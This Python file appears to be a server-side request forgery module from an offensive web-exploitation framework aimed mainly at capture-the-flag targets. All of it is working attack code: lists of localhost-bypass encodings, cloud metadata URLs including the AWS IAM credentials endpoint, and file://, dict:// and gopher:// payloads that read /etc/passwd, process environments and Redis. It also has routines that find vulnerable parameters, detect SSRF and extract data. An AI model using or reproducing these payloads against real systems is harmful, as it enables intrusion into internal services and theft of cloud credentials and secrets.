"""
EnoughOfWeb — Server-Side Request Forgery (SSRF) Module
Localhost bypasses, cloud metadata endpoints, protocol smuggling.
"""

import re
import time
from typing import List, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

from modules.base import BaseExploit, Finding, ExploitResult, Severity


# ── Localhost bypass payloads ──────────────────────────────────────────────
LOCALHOST_BYPASSES = [
    "http://127.0.0.1",
    "http://localhost",
    "http://127.1",
    "http://0",
    "http://0.0.0.0",
    "http://0x7f000001",
    "http://2130706433",
    "http://017700000001",
    "http://[::1]",
    "http://0000::1",
    "http://127.0.0.1.nip.io",
    "http://localtest.me",
    "http://127.0.0.1:80",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:443",
    "http://127.0.0.1:3000",
    "http://127.0.0.1:5000",
    "http://127.0.0.1:8000",
]

# ── Internal path targets ─────────────────────────────────────────────────
INTERNAL_PATHS = [
    "/", "/admin", "/flag", "/flag.txt", "/etc/passwd",
    "/api/flag", "/internal", "/debug", "/console", "/env",
    "/server-status", "/server-info",
]

# ── Cloud metadata endpoints ──────────────────────────────────────────────
CLOUD_METADATA = {
    "aws_meta": "http://169.254.169.254/latest/meta-data/",
    "aws_userdata": "http://169.254.169.254/latest/user-data/",
    "aws_iam": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "aws_hostname": "http://169.254.169.254/latest/meta-data/hostname",
    "gcp_meta": "http://metadata.google.internal/computeMetadata/v1/",
    "azure_meta": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "digitalocean": "http://169.254.169.254/metadata/v1/",
}

# ── Protocol payloads ─────────────────────────────────────────────────────
PROTOCOL_PAYLOADS = [
    "file:///etc/passwd",
    "file:///etc/hostname",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///flag",
    "file:///flag.txt",
    "file:///app/flag.txt",
    "file:///var/www/html/flag.txt",
    "file:///C:/Windows/win.ini",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_INFO",
]

# ── URL parameter names commonly vulnerable to SSRF ───────────────────────
SSRF_PARAM_NAMES = {
    "url", "uri", "link", "href", "src", "source", "dest", "destination",
    "redirect", "redirect_url", "redirect_uri", "return", "return_url",
    "next", "target", "path", "file", "page", "load", "fetch", "proxy",
    "callback", "api", "endpoint", "webhook", "image", "img", "avatar",
    "icon", "pdf", "doc", "resource", "feed", "rss",
}


class SSRFExploit(BaseExploit):
    name = "ssrf"
    description = "Server-Side Request Forgery — localhost bypass, cloud metadata, protocol smuggling"
    priority = 7

    def detect(self, target_url: str, recon_data: dict) -> List[Finding]:
        findings: List[Finding] = []
        injection_points = self._gather_injection_points(target_url, recon_data)

        for point in injection_points:
            finding = self._detect_ssrf(point)
            if finding:
                findings.append(finding)

        return findings

    def exploit(self, finding: Finding) -> ExploitResult:
        try:
            return self._exploit_ssrf(finding)
        except Exception as e:
            return ExploitResult(success=False, error=str(e))

    # ── Internal ──────────────────────────────────────────────────────────

    def _gather_injection_points(self, target_url, recon_data):
        points = []
        seen = set()

        # URL parameters
        for p in recon_data.get("parameters", []):
            name = p["name"].lower()
            if name in SSRF_PARAM_NAMES:
                key = (p.get("url", target_url), p["name"])
                if key not in seen:
                    seen.add(key)
                    points.append({
                        "url": p.get("url", target_url),
                        "param": p["name"],
                        "method": "GET" if p.get("location") == "url" else "POST",
                    })

        # Form inputs
        for form in recon_data.get("forms", []):
            form_url = urljoin(target_url, form.get("action", ""))
            method = form.get("method", "POST").upper()
            for input_name, input_val in form.get("inputs", {}).items():
                if input_name.lower() in SSRF_PARAM_NAMES:
                    key = (form_url, input_name)
                    if key not in seen:
                        seen.add(key)
                        points.append({
                            "url": form_url,
                            "param": input_name,
                            "method": method,
                            "base_data": dict(form.get("inputs", {})),
                        })

        # If nothing found, try common SSRF param names on target
        if not points:
            for name in ["url", "uri", "link", "src", "redirect", "fetch", "path", "file"]:
                points.append({"url": target_url, "param": name, "method": "GET"})

        return points

    def _send(self, point, payload):
        url = point["url"]
        param = point["param"]
        method = point["method"]
        base_data = point.get("base_data", {})

        try:
            if method == "GET":
                parsed = urlparse(url)
                qs = parse_qs(parsed.query, keep_blank_values=True)
                qs[param] = [payload]
                new_query = urlencode(qs, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                return self._request("GET", test_url)
            else:
                data = dict(base_data)
                data[param] = payload
                return self._request("POST", url, data=data)
        except Exception:
            return None

    def _detect_ssrf(self, point) -> Optional[Finding]:
        # Get baseline response
        baseline = self._send(point, "http://example.com")
        if baseline is None:
            return None
        baseline_len = len(baseline.text)

        # Try localhost bypasses with various internal paths
        for bypass in LOCALHOST_BYPASSES[:8]:  # Test first 8 for speed
            for path in ["/", "/admin", "/flag"]:
                payload = f"{bypass}{path}"
                resp = self._send(point, payload)
                if resp is None:
                    continue

                # Detection: significantly different response = SSRF
                len_diff = abs(len(resp.text) - baseline_len)
                if len_diff > 50 and resp.status_code == 200:
                    # Check for internal content indicators
                    indicators = ["root:", "admin", "flag", "internal", "secret",
                                  "password", "config", "debug", "<!DOCTYPE"]
                    if any(ind in resp.text.lower() for ind in indicators) or len_diff > 200:
                        return Finding(
                            module=self.name,
                            vuln_type="ssrf-localhost-bypass",
                            target_url=point["url"],
                            parameter=point["param"],
                            method=point["method"],
                            payload=payload,
                            evidence=f"Response diff: {len_diff} bytes (bypass: {bypass})",
                            severity=Severity.HIGH,
                            extra={"bypass": bypass, "path": path, "base_data": point.get("base_data", {})},
                        )

        # Try file:// protocol
        for proto_payload in PROTOCOL_PAYLOADS[:5]:
            resp = self._send(point, proto_payload)
            if resp is None:
                continue
            if resp.status_code == 200 and len(resp.text) > baseline_len + 20:
                if "root:" in resp.text or "[fonts]" in resp.text or "flag" in resp.text.lower():
                    return Finding(
                        module=self.name,
                        vuln_type="ssrf-protocol",
                        target_url=point["url"],
                        parameter=point["param"],
                        method=point["method"],
                        payload=proto_payload,
                        evidence=f"Protocol payload returned content ({len(resp.text)} bytes)",
                        severity=Severity.CRITICAL,
                        extra={"base_data": point.get("base_data", {})},
                    )

        # Try cloud metadata
        for name, meta_url in list(CLOUD_METADATA.items())[:3]:
            resp = self._send(point, meta_url)
            if resp is None:
                continue
            if resp.status_code == 200 and len(resp.text) > baseline_len + 20:
                return Finding(
                    module=self.name,
                    vuln_type="ssrf-cloud-metadata",
                    target_url=point["url"],
                    parameter=point["param"],
                    method=point["method"],
                    payload=meta_url,
                    evidence=f"Cloud metadata accessible: {name}",
                    severity=Severity.CRITICAL,
                    extra={"cloud": name, "base_data": point.get("base_data", {})},
                )

        return None

    def _exploit_ssrf(self, finding: Finding) -> ExploitResult:
        url = finding.target_url
        param = finding.parameter
        method = finding.method
        base_data = finding.extra.get("base_data", {})
        point = {"url": url, "param": param, "method": method, "base_data": base_data}

        vuln_type = finding.vuln_type
        all_data = []

        if vuln_type == "ssrf-localhost-bypass":
            bypass = finding.extra.get("bypass", "http://127.0.0.1")

            # Enumerate internal paths
            for path in INTERNAL_PATHS:
                payload = f"{bypass}{path}"
                resp = self._send(point, payload)
                if resp is None:
                    continue

                flag = self._check_flag(resp.text)
                if flag:
                    return ExploitResult(
                        success=True, flag=flag, payload_used=payload,
                        technique="ssrf-internal-read", raw_response=resp.text[:2000],
                    )
                if resp.status_code == 200 and len(resp.text) > 20:
                    all_data.append(f"[{path}] {resp.text[:200]}")

            # Try all localhost bypasses
            for bypass2 in LOCALHOST_BYPASSES:
                for path in ["/flag", "/flag.txt", "/api/flag"]:
                    payload = f"{bypass2}{path}"
                    resp = self._send(point, payload)
                    if resp and resp.status_code == 200:
                        flag = self._check_flag(resp.text)
                        if flag:
                            return ExploitResult(
                                success=True, flag=flag, payload_used=payload,
                                technique="ssrf-flag-read",
                            )

        elif vuln_type == "ssrf-protocol":
            # Try more file:// paths
            for proto_payload in PROTOCOL_PAYLOADS:
                resp = self._send(point, proto_payload)
                if resp and resp.status_code == 200:
                    flag = self._check_flag(resp.text)
                    if flag:
                        return ExploitResult(
                            success=True, flag=flag, payload_used=proto_payload,
                            technique="ssrf-file-read",
                        )
                    if len(resp.text) > 10:
                        all_data.append(f"[{proto_payload}] {resp.text[:300]}")

        elif vuln_type == "ssrf-cloud-metadata":
            cloud = finding.extra.get("cloud", "")
            # Dig deeper into metadata
            for name, meta_url in CLOUD_METADATA.items():
                resp = self._send(point, meta_url)
                if resp and resp.status_code == 200:
                    flag = self._check_flag(resp.text)
                    if flag:
                        return ExploitResult(
                            success=True, flag=flag, payload_used=meta_url,
                            technique="ssrf-cloud-metadata",
                        )
                    all_data.append(f"[{name}] {resp.text[:300]}")

        return ExploitResult(
            success=bool(all_data),
            payload_used=finding.payload,
            technique=vuln_type,
            data_extracted="\n".join(all_data) if all_data else None,
        )
